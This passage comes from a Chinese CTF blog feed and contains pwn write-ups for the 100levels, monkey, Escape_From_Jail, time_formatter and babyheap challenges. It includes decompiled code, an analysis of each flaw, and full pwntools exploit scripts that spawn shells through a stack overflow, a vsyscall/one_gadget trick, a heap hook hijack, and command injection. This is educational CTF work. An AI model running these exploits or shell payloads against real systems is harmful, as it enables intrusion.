time(0LL);</span><br><span class="line">      sprintf((char *)&amp;v10, &quot;Great job! You finished %d levels in %d seconds\n&quot;, cnt, (unsigned int)(v3 - v6), num2);</span><br><span class="line">      puts((const char *)&amp;v10);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You failed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Coward Coward Coward Coward Coward&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>go调用的check<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall check(signed int cnt)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // eax</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  __int64 buf; // [rsp+10h] [rbp-30h]</span><br><span class="line">  __int64 v5; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-20h]</span><br><span class="line">  __int64 v7; // [rsp+28h] [rbp-18h]</span><br><span class="line">  unsigned int v8; // [rsp+34h] [rbp-Ch]</span><br><span class="line">  unsigned int num2; // [rsp+38h] [rbp-8h]</span><br><span class="line">  unsigned int num1; // [rsp+3Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  buf = 0LL;</span><br><span class="line">  v5 = 0LL;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  if ( !cnt )</span><br><span class="line">    return 1LL;</span><br><span class="line">  if ( (unsigned int)check(cnt - 1) == 0 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  num1 = rand() % cnt;</span><br><span class="line">  v2 = rand();</span><br><span class="line">  num2 = v2 % cnt;</span><br><span class="line">  v8 = v2 % cnt * num1;</span><br><span class="line">  puts(&quot;====================================================&quot;);</span><br><span class="line">  printf(&quot;Level %d\n&quot;, (unsigned int)cnt);</span><br><span class="line">  printf(&quot;Question: %d * %d = ? Answer:&quot;, num1, num2);</span><br><span class="line">  read(0, &amp;buf, 0x400uLL);                      // overflow</span><br><span class="line">  v3 = strtol((const char *)&amp;buf, 0LL, 10);</span><br><span class="line">  return v3 == v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>hint<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int hint()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v1; // [rsp+8h] [rbp-108h]</span><br><span class="line">  int v2; // [rsp+10h] [rbp-100h]</span><br><span class="line">  __int16 v3; // [rsp+14h] [rbp-FCh]</span><br><span class="line"></span><br><span class="line">  if ( flag )</span><br><span class="line">  &#123;</span><br><span class="line">    sprintf((char *)&amp;v1, &quot;Hint: %p\n&quot;, &amp;system, &amp;system);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = &apos;N NWP ON&apos;;</span><br><span class="line">    v2 = &apos;UF O&apos;;</span><br><span class="line">    v3 = &apos;N&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts((const char *)&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>容易发现的漏洞就是check时的溢出，还有问题就是go初始时输入两次值，最后使用的是两次加起来的值，但是如果第一次输入的值小于等于0就不会初始化第一个值。</p><p>最刚开始的想法是通过溢出修改存储在bss段的flag位然后返回到主函数，再使用hint泄露system函数地址<br>但是因为程序开启了pie，因此bss段位置也就是不定的，而如果想要泄露libc，又因为是64位程序，因此需要gadget，但是gadgets的位置也因为pie变得位置不定，所以行不通。</p><p>再观察程序，发现：<br>hint函数是先将system函数地址读到了栈上，之后调用fprintf函数输出的，其地址为rbp-0x110<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_110         = qword ptr -110h</span><br><span class="line"></span><br><span class="line">mov     rax, cs:system_ptr</span><br><span class="line">mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure></p><p>而如果go读取的第一个数没有初始化的话，他的值就是栈上的值，而它的地址恰巧也是rbp-0x110<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 num1; // [rsp+10h] [rbp-110h]</span><br></pre></td></tr></table></figure></p><p>所以我们按理说是可以利用那个对大小判断的函数来逐位爆破system的地址<br>这里需要注意的是如果和大于0进入check，如果顺着令其运行完会直接退出，所以也需要在check中溢出覆盖返回地址以便能够继续爆破</p><p>而覆盖的返回地址依旧是不确定的，观察程序运行时的内存映射，发现程序的最后vsyscall段是恒定不变的，我们可以利用它来绕过pie；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0xffffffffff600400</span><br><span class="line">   0xffffffffff600400:mov    rax,0xc9</span><br><span class="line">   0xffffffffff600407:syscall </span><br><span class="line">   0xffffffffff600409:ret    </span><br><span class="line">   0xffffffffff60040a:int3   </span><br><span class="line">   0xffffffffff60040b:int3</span><br></pre></td></tr></table></figure></p><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>思路一没有复现成功，看到了大佬们的简单一点的思路</p><p>前面基本一致，但是不再去爆破system的地址，而是将其覆盖位one_gadget的地址，也就是计算二者偏移的差值然后将其加上去直接得到one_gadget RCE,可以看到这个地址被存放在了栈上，我们的目标就是在后面的栈溢出中想办法使得返回到此处。</p><p>执行最后一次时的栈情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">03:0018│ rsi  0x7ffe36cd7780 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7ffe36cd77a0 ◂— 0x1ae00000000</span><br><span class="line">08:0040│      0x7ffe36cd77a8 ◂— 0x2b0000000a /* &apos;\n&apos; */</span><br><span class="line">09:0048│ rbp  0x7ffe36cd77b0 —▸ 0x7ffe36cd78e0 —▸ 0x7ffe36cd7920 —▸ 0x556f0672efd0 ◂— push   r15</span><br><span class="line">0a:0050│      0x7ffe36cd77b8 —▸ 0x556f0672ec8a ◂— test   eax, eax</span><br><span class="line">0b:0058│      0x7ffe36cd77c0 ◂— 0xfffffffffffffeda</span><br><span class="line">0c:0060│      0x7ffe36cd77c8 ◂— 0x556f5caa9f45       -------》 one_gadget 在这里</span><br></pre></td></tr></table></figure></p><p>我们就可以使用vsyscall中的不变量来使返回地址滑向此处执行one_gadget</p><ul><li>关于 vsyscall</li></ul><p>简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">system_offset = 0x45390</span><br><span class="line">ret_address = 0xffffffffff600400</span><br><span class="line">target_offset = 0x4526a</span><br><span class="line"></span><br><span class="line">difference = target_offset - system_offset</span><br><span class="line"></span><br><span class="line">def answer(eqn):</span><br><span class="line">    parse = eqn[9:eqn.find(&quot;=&quot;)]</span><br><span class="line">    soln = eval(parse)</span><br><span class="line">    return soln</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    p = process(&quot;./100levels&quot;)</span><br><span class="line">    #p = remote(&quot;47.74.147.103&quot;, 20001)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(&quot;0&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(str(difference))</span><br><span class="line"></span><br><span class="line">    for i in range(99):</span><br><span class="line">        p.recvline_contains(&quot;Level&quot;)</span><br><span class="line">        eqn = p.clean()</span><br><span class="line"></span><br><span class="line">        soln = answer(eqn)</span><br><span class="line">        p.send(str(soln)+&quot;\x00&quot;)</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    pay = str(soln) + &quot;\x00&quot;</span><br><span class="line">    pay = pay.ljust(56, &quot;B&quot;)</span><br><span class="line">    pay += p64(ret_address)*3</span><br><span class="line">    log.info(&quot;Injected our vsyscall ROPs&quot;)</span><br><span class="line"></span><br><span class="line">    p.send(pay)</span><br><span class="line">    p.clean()</span><br><span class="line"></span><br><span class="line">    p.success(&quot;Shell spawned! Enjoy!&quot;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>未成功的思路一</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">sh=process(&apos;./100levels&apos;)</span><br><span class="line">#sh=remote(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./100levels&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line"></span><br><span class="line">def go(level,more):</span><br><span class="line">sh.recvuntil(&apos;Choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;levels?\n&apos;)</span><br><span class="line">sh.sendline(str(level))</span><br><span class="line">sh.recvuntil(&apos;more?\n&apos;)</span><br><span class="line">sh.sendline(str(more))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hint():</span><br><span class="line">sh.sendlineafter(&apos;Choice:\n&apos;,&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def calc(answer):</span><br><span class="line">sh.sendlineafter(&apos;Answer:&apos;,answer)</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">start = 0x700000000390</span><br><span class="line">for i in range(10,2,-1):</span><br><span class="line">for j in range(15,-1,-1):</span><br><span class="line">hint()</span><br><span class="line">addr_test = start+(1 &lt;&lt; (i*4)*j)</span><br><span class="line">go(0,-addr_test)</span><br><span class="line">a = sh.recvline()</span><br><span class="line"></span><br><span class="line">if &apos;Coward&apos; not in a:</span><br><span class="line">                start = addr_test</span><br><span class="line">log.info(&apos;check &apos;+ hex(addr_test))</span><br><span class="line">                break</span><br><span class="line">        pro = log.progress(&apos;go&apos;)</span><br><span class="line">        for i in range(99):</span><br><span class="line">            pro.status(&apos;level %d&apos;%(i+1))</span><br><span class="line">            calc(p64(0)*5)</span><br><span class="line">        #gdb.attach(sh)</span><br><span class="line">calc(p64(0)*5+p64(0xffffffffff600400)*3)</span><br><span class="line">       #gdb.attach(sh)</span><br><span class="line">pro.success(&apos;ok&apos;)</span><br><span class="line">return start + 0x100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system=leak()</span><br><span class="line">print system</span><br><span class="line"></span><br><span class="line">binsh_addr = system - libc.symbols[&apos;system&apos;]+libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">pop_rdi_ret = system - libc.symbols[&apos;system&apos;]+0x21102</span><br><span class="line"></span><br><span class="line">pay = p64(pop_rdi_ret)+p64(binsh_addr)+p64(system)</span><br><span class="line">go(1,0)</span><br><span class="line">pay = &apos;0&apos;*0x38+pay</span><br><span class="line">calc(pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://bbs.ichunqiu.com/thread-43627-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43627-1-1.html</a><br><a href="https://nandynarwhals.org/hitbgsec2017-1000levels/" target="_blank" rel="noopener">https://nandynarwhals.org/hitbgsec2017-1000levels/</a><br><a href="https://znqt.github.io/hitb-gsec-pwn-1000levels/" target="_blank" rel="noopener">https://znqt.github.io/hitb-gsec-pwn-1000levels/</a></p><h1 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h1><h2 id="题目-amp-分析-amp-exp"><a href="#题目-amp-分析-amp-exp" class="headerlink" title="题目 &amp; 分析 &amp; exp"></a>题目 &amp; 分析 &amp; exp</h2><p>算是js的沙箱逃逸，给了个The SpiderMonkey shell，可以查询到它的源码之类的东西，<br>可以发现其没有任何过滤，所以给个os.system(“/bin/sh”) 直接拿shell即可</p><h1 id="Escape-From-Jail-50"><a href="#Escape-From-Jail-50" class="headerlink" title="Escape_From_Jail-50"></a>Escape_From_Jail-50</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>python沙箱逃逸，只给了个远程连接，检测到被过滤的字符会报错</p><p>banned：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.  / &apos; /  import /flag /eval /exec / dir(__builtins__)无反馈 等等</span><br></pre></td></tr></table></figure></p><h2 id="分析-amp-exp"><a href="#分析-amp-exp" class="headerlink" title="分析 &amp; exp"></a>分析 &amp; exp</h2><p>许多常见的基本上都被过滤了</p><p>不能使用import关键字且不允许使用 “.”，一大部分路就被绝了,</p><p>os，未被过滤，但是基本调用需要”.”,所以需要其他方式。</p><p>查询资料发现 getattr函数可以使用</p><p>相关资料可以看菜鸟：<a href="http://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-getattr.html</a></p><p>getattr(os,”system”)(“/bin/sh”)</p><h1 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h1><p>比较有意思的一个题目，刚开始没看懂题。。</p><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall print(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // r8</span><br><span class="line">  char command; // [rsp+8h] [rbp-810h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+808h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(&amp;command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&apos;%s&apos;&quot;, (unsigned int)time, ptr, a3);</span><br><span class="line">    __printf_chk(1LL, &quot;Your formatted time is: &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    if ( getenv(&quot;DEBUG&quot;) )</span><br><span class="line">      __fprintf_chk(stderr, 1LL, &quot;Running command: %s\n&quot;, &amp;command, v3);</span><br><span class="line">    setenv(&quot;TZ&quot;, value, 1);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You haven&apos;t specified a format!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>退出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __noreturn exit()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  char s; // [rsp+8h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v2; // [rsp+18h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  free__(ptr);</span><br><span class="line">  free__(value);</span><br><span class="line">  __printf_chk(1LL, &quot;Are you sure you want to exit (y/N)? &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  result = 0LL;</span><br><span class="line">  if ( (s &amp; 0xDF) == 89 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;OK, exiting.&quot;);</span><br><span class="line">    result = 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-amp-amp-exp"><a href="#分析-amp-amp-exp" class="headerlink" title="分析&amp;&amp;exp"></a>分析&amp;&amp;exp</h2><p>问题出在退出时先free然后再询问是否退出，这个时候选择不退出的话就会出现UAF漏洞</p><p>在system中执行command命令，command字符串通过snprintf_chk函数拼接起来，可以百度一下这个函数的用法，注意字符串/bin/date -d @%d +’%s’，按照linux 64的函数传参顺序，分别是rdi rsi rdx rcx r8 r9 然后是栈 ，所以此时%s对应第一个入栈的参数，也就是rax 也就是qword_602118，所以只要控制了qword_602118，就可以执行任意系统命令（注意闭合单引号）。</p><p>所以依次执行 1，5 / N ，3 / ‘;/bin/sh#’ , 4 即可</p><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h2 id="题目-amp-amp-分析"><a href="#题目-amp-amp-分析" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>正常题目，edit时没有检查存储的size</p><p>所以虽然保护全开，我们仍然可以使用溢出来overlap来泄露地址及其他</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./babyheap&apos;)</span><br><span class="line">sh = remote(&apos;111.198.29.45&apos;,&apos;31717&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def new(length,con):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(str(length))</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def edit(idx,length,con):</span><br><span class="line">        sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line">        sh.sendline(str(length))</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">        sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0x10,&apos;a&apos;*0x10)  #0</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #1</span><br><span class="line">new(0x10,&apos;c&apos;*0x10)  #2</span><br><span class="line">new(0x10,&apos;d&apos;*0x10)  #3</span><br><span class="line">new(0x10,&apos;e&apos;*0x10)  #4</span><br><span class="line"></span><br><span class="line">#--------------leak heap base----------------</span><br><span class="line">edit(0,0x20,&apos;a&apos;*0x18+p64(0x41))</span><br><span class="line">dele(1)</span><br><span class="line">new(0x30,&apos;b&apos;*0x18+p64(0x21)+&apos;c&apos;*0x10)  #1</span><br><span class="line">dele(4)</span><br><span class="line">dele(2)</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(p64(0x21))</span><br><span class="line">heap = u64(sh.recv(8))-0x80</span><br><span class="line">print &apos;heap_base: &apos;+hex(heap)</span><br><span class="line">#--------------leak libc base----------------</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #2</span><br><span class="line">new(0x10,&apos;e&apos;*0x10)  #4</span><br><span class="line">new(0x10,&apos;f&apos;*0x10)  #5</span><br><span class="line"></span><br><span class="line">new(0x10,&apos;deadbeef&apos;*2) #6</span><br><span class="line">#new(0x90,&apos;c&apos;*0x90)</span><br><span class="line"></span><br><span class="line">edit(0,0x28,&apos;a&apos;*0x18+p64(0xa1)+&apos;a&apos;*8)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(1)</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #1</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show(2)</span><br><span class="line">main_arena = u64(sh.recv(8))-88</span><br><span class="line">malloc_hook = main_arena - 0x10</span><br><span class="line">libc.base = malloc_hook - libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">one_gadget = libc.base+0x4526a</span><br><span class="line">print &apos;libc: &apos;+hex(libc.base)</span><br><span class="line">#------------hjack malloc_hook to getshell----------</span><br><span class="line">new(0x70,&apos;c&apos;*0x60+p64(0)+p64(0x31))  #2 &amp; 7</span><br><span class="line">edit(1,0x28,&apos;b&apos;*0x18+p64(0x71)+&apos;c&apos;*8)</span><br><span class="line">dele(7)</span><br><span class="line">edit(2,8,p64(main_arena-0x33))</span><br><span class="line">new(0x60,&apos;c&apos;*0x60)</span><br><span class="line">new(0x63,&apos;a&apos;*0x13+p64(one_gadget)+p64(0)*9)</span><br><span class="line">new(1,&apos;a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;100levels&quot;&gt;&lt;a href=&quot;#100levels&quot; class=&quot;headerlink&quot; title=&quot;100levels&quot;&gt;&lt;/a&gt;100levels&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="stack" scheme="http://siriuswhiter.tk/categories/stack/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>Sql Injection</title>
    <link href="http://siriuswhiter.tk/2019/04/01/sql-injection/"/>
    <id>http://siriuswhiter.tk/2019/04/01/sql-injection/</id>
    <published>2019-04-01T02:18:22.000Z</published>
    <updated>2019-04-05T01:41:46.105Z</updated>
    
